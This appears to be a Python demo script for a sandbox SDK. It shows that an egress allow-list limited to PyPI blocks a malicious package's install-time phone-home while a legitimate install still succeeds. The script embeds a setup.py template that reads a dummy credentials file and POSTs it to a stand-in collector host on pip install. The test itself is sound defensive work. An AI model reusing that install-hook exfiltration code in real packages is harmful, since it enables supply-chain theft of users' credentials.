"""Supply-chain-safe installs: a sandbox whose egress allows only the package registry, so an untrusted
package's install-time phone-home cannot reach its server while a legitimate install still succeeds."""
from __future__ import annotations

import argparse
import json
import os
import secrets
import sys
import time
from datetime import datetime, timedelta, timezone

REQUIRED_ENV = ("NEEV_API_KEY", "NEEV_ORG_ID", "NEEV_PROJECT_ID")  # no model key: this recipe runs no model

# The only destinations the installs need; everything else (the collector) is off the allow-list.
ALLOWED_HOSTS = ["pypi.org", "files.pythonhosted.org"]
COLLECTOR_HOST = "example.org"                 # a real host, deliberately never allowed, so never reached
COLLECTOR_URL = f"https://{COLLECTOR_HOST}/collect"

EVIL_DIR = "evilpkg"                           # the untrusted package, built in the sandbox at runtime
MARKER_PATH = "/workspace/phone_home.json"     # the untrusted setup.py records its attempt here
SECRET_PATH = "secret-store/credentials"       # relative to /workspace, written by this script
SECRET_ABS = f"/workspace/{SECRET_PATH}"
DUMMY_SECRET = "sk-demo-NOT-A-REAL-SECRET-00000000\n"  # obviously fake; nothing real is ever at risk
PHONE_HOME_TIMEOUT_S = 6                        # bounds the collector attempt if a blocked host hangs

DEFAULT_LEGIT_PACKAGE = "requests"
LEGIT_TARGET = "/workspace/legit-lib"          # install into a fresh dir so the registry is always hit
PIP_TIMEOUT_MS = 180_000

AUDIT_POLL_ATTEMPTS = 6
AUDIT_POLL_INTERVAL_S = 2.0

# The untrusted package's phone-home, run by setup.py at install time: it first tests whether the
# collector is reachable at all (a TCP connect), and only then uploads the secret. The TCP connect is
# the decisive signal — if it never opens, zero bytes can leave, whatever HTTP status a reachable
# collector would return. Sentinels are filled so the in-sandbox code and this module cannot drift.
_PHONE_HOME_TEMPLATE = '''\
import json, os, socket, urllib.parse, urllib.request

URL = "__URL__"
MARKER = "__MARKER__"
SECRET_FILE = "__SECRET__"
TIMEOUT = __TIMEOUT__


def phone_home():
    try:
        secret = open(SECRET_FILE).read().strip()
    except OSError:
        secret = ""
    parts = urllib.parse.urlsplit(URL)
    port = parts.port or (443 if parts.scheme == "https" else 80)
    rec = dict(url=URL, secret_len=len(secret), connected=False, sent_ok=False, error="")
    try:
        sock = socket.create_connection((parts.hostname, port), timeout=TIMEOUT)
        sock.close()
        rec["connected"] = True   # the TCP channel opened: bytes could now leave the sandbox
    except Exception as exc:
        rec["error"] = type(exc).__name__ + ": " + str(exc)
    if rec["connected"]:
        try:
            req = urllib.request.Request(URL, data=secret.encode(), method="POST")
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                resp.read()
            rec["sent_ok"] = True
        except Exception as exc:
            rec["error"] = type(exc).__name__ + ": " + str(exc)
    with open(MARKER, "w") as handle:
        json.dump(rec, handle)


# Runs once per install; the marker guard keeps pip's repeated setup.py calls to a single attempt.
if not os.path.exists(MARKER):
    phone_home()
'''

# Appended after the phone-home so the untrusted package is a normal, installable package.
_SETUP_SUFFIX = '''
from setuptools import setup

setup(name="evilpkg", version="0.0.1", py_modules=["evilpkg"])
'''


def missing_env(environ) -> list[str]:
    """Returns the required variables that are not set."""
    return [name for name in REQUIRED_ENV if not environ.get(name)]


def _phone_home_code(url: str, marker: str, secret_file: str, timeout: int) -> str:
    """Fills the phone-home template; kept separate so tests can point it at a local server of their own."""
    return (_PHONE_HOME_TEMPLATE
            .replace("__URL__", url)
            .replace("__MARKER__", marker)
            .replace("__SECRET__", secret_file)
            .replace("__TIMEOUT__", str(timeout)))


def evil_package_files() -> dict[str, str]:
    """Returns the untrusted package's files (relative to EVIL_DIR); its setup.py phones home at install time."""
    setup_py = _phone_home_code(COLLECTOR_URL, MARKER_PATH, SECRET_ABS, PHONE_HOME_TIMEOUT_S) + _SETUP_SUFFIX
    return {"setup.py": setup_py, "evilpkg.py": "# the package itself does nothing; the harm is in setup.py\n"}


def write_fixture(sandbox, log=print) -> None:
    """Writes the untrusted package under EVIL_DIR/ and a dummy secret file, both from code (never committed)."""
    for name, content in evil_package_files().items():
        sandbox.files.write(f"{EVIL_DIR}/{name}", content)
    sandbox.files.write(SECRET_PATH, DUMMY_SECRET)
    log(f"   Wrote {EVIL_DIR}/ (setup.py + module) and a dummy {SECRET_PATH}")


def install_untrusted(sandbox, log=print):
    """Installs the untrusted package with pip; build isolation pulls setuptools from the allowed registry."""
    result = sandbox.exec("pip3", ["install", "--no-input", f"./{EVIL_DIR}"],
                          cwd="/workspace", timeout_ms=PIP_TIMEOUT_MS)
    log(f"   pip install ./{EVIL_DIR}: exit {result.exit_code}")
    return result


def read_marker(sandbox):
    """Reads the untrusted setup.py's record of its phone-home attempt, or None if it was never written."""
    try:
        return json.loads(sandbox.files.read_text(MARKER_PATH))
    except Exception:
        return None


def phone_home_blocked(marker) -> bool:
    """Blocked means the TCP connection to the collector never opened, so zero bytes could leave the sandbox.

    A reachable collector that merely answered non-2xx is NOT blocked: the secret would already have left.
    """
    return bool(marker) and marker.get("connected") is False


def install_legit(sandbox, package: str, log=print):
    """Installs a legitimate package from PyPI into a fresh target dir, so the registry is always contacted."""
    result = sandbox.exec("pip3", ["install", "--no-input", "--target", LEGIT_TARGET, package],
                          cwd="/workspace", timeout_ms=PIP_TIMEOUT_MS)
    log(f"   pip install {package}: exit {result.exit_code}")
    return result


def verify_legit_import(sandbox, package: str, log=print) -> None:
    """Best-effort confirmation that the installed package imports; informational only, since the import
    name can differ from the package name (e.g. beautifulsoup4 -> bs4), so it never gates the result."""
    code = (f"import sys; sys.path.insert(0, {LEGIT_TARGET!r}); import {package} as m; "
            f"print(getattr(m, '__version__', 'ok'))")
    result = sandbox.exec("python3", ["-c", code], cwd="/workspace")
    if result.exit_code == 0:
        log(f"   import {package}: {result.stdout.strip()}")
    else:
        log(f"   import {package}: not verified (it installs under a different module name); install still succeeded")


def legit_install_ok(install_result) -> bool:
    """The legitimate dependency reached the sandbox when pip exited 0, i.e. the registry was reachable."""
    return install_result.exit_code == 0


def _outcome(record) -> str:
    """Reads an audit record's outcome as a plain string, whether it is an enum or already text."""
    return getattr(record.outcome, "value", str(record.outcome))


def _pipish(command) -> bool:
    """True for a pip program name, so the audit view shows the install runs and not pip's own helpers."""
    return command in ("pip", "pip3")


def pip_records(sandbox, since: str, expected: int = 2, attempts: int = AUDIT_POLL_ATTEMPTS,
                interval_s: float = AUDIT_POLL_INTERVAL_S, wait=time.sleep, log=print) -> list:
    """Polls the audit trail from `since` until `expected` pip runs appear; returns what it has when the poll ends."""
    records = []
    for attempt in range(attempts):
        records = [r for r in sandbox.audit(from_=since, limit=100).records
                   if r.tool == "exec" and _pipish(r.command)]
        if len(records) >= expected:
            return records
        if attempt < attempts - 1:
            wait(interval_s)
    log(f"   ({len(records)} of {expected} pip records in the audit trail so far; it can lag a few seconds)")
    return records


def run(package: str, client, log=print, wait=time.sleep) -> int:
    """Creates a registry-only sandbox, installs an untrusted then a legitimate package, proves the boundary, always deletes it."""
    sandbox = None
    try:
        log(f"1. Creating a sandbox (egress allow-list: only {', '.join(ALLOWED_HOSTS)})...")
        sandbox = client.sandboxes.create({"name": f"safe-install-{secrets.token_hex(4)}"},
                                          allow_egress=ALLOWED_HOSTS)
        sandbox.wait_until_ready(timeout_ms=300_000)
        log("2. Building the untrusted package in the sandbox (its setup.py phones home at install time)...")
        write_fixture(sandbox, log)
        # A small margin so local clock skew cannot hide the pip records from the audit window.
        since = (datetime.now(timezone.utc) - timedelta(seconds=5)).isoformat()
        log(f"3. Installing the untrusted package (it tries to POST the secret to {COLLECTOR_HOST})...")
        install_untrusted(sandbox, log)
        marker = read_marker(sandbox)
        blocked = phone_home_blocked(marker)
        if marker is None:
            log("   Phone-home marker not found or unreadable.")
        elif blocked:
            log(f"   Phone-home attempted: read {marker.get('secret_len', 0)} secret bytes; the connection to "
                f"{COLLECTOR_HOST} never opened, so 0 bytes left the sandbox ({marker.get('error', '')})")
        else:
            log(f"   Phone-home NOT BLOCKED: the connection to {COLLECTOR_HOST} opened, so "
                f"{marker.get('secret_len', 0)} bytes could leave (sent_ok={marker.get('sent_ok')})")
        log(f"4. Installing a legitimate package from PyPI ({package})...")
        legit = install_legit(sandbox, package, log)
        verify_legit_import(sandbox, package, log)
        legit_ok = legit_install_ok(legit)
        log("5. Audit trail of the pip runs (program, target, outcome; arguments are never recorded):")
        for record in pip_records(sandbox, since, wait=wait, log=log):
            log(f"   {record.command} {record.target or '-'} -> {_outcome(record)}")
        if not (blocked and legit_ok):
            log("The boundary did not hold as expected "
                f"(phone-home blocked: {blocked}, legitimate install ok: {legit_ok}).")
            return 1
        log(f"The boundary held: the install-time POST to {COLLECTOR_HOST} never connected (0 bytes sent), "
            f"and {package} installed from PyPI.")
        return 0
    except KeyboardInterrupt:
        return 130
    except Exception as e:  # e.g. a rejected key: one line instead of a traceback
        log(f"Failed: {type(e).__name__}: {e}")
        return 1
    finally:
        if sandbox is not None:
            try:
                sandbox.delete()
                log("   Sandbox deleted.")
            except Exception as e:  # never let a cleanup error bury the run's result with a traceback
                log(f"   Warning: could not delete sandbox {sandbox.name}: {type(e).__name__}: {e}")


def main(argv=None) -> int:
    """Parses arguments, checks the environment, and runs the recipe."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("package", nargs="?", default=DEFAULT_LEGIT_PACKAGE,
                        help="the legitimate PyPI package to install (default: requests)")
    args = parser.parse_args(argv)
    missing = missing_env(os.environ)
    if missing:
        print(f"Missing environment variables: {', '.join(missing)}. See README.md.", file=sys.stderr)
        return 2
    from neevai import NeevAI

    with NeevAI() as client:
        return run(args.package, client)


if __name__ == "__main__":
    sys.exit(main())
